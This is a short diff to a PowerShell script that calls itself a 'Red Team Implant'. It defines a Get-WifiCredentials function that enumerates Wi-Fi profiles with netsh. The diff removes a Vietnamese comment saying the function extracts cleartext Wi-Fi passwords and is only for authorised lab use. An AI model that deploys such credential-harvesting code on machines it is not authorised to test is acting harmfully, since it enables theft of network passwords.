@@ -1,12 +1,6 @@
 Write-Host "Hello World from Kushy Red Team Implant"
 
 function Get-WifiCredentials {
-    <#
-    .SYNOPSIS
-      Lấy danh sách profile Wi-Fi và mật khẩu (key=clear) trên máy local.
-    .NOTES
-      Chỉ dùng trong môi trường được phép (máy local / lab).
-    #>
 
     $profilesRaw = netsh wlan show profiles 2>$null
     if (-not $profilesRaw) { return @() }
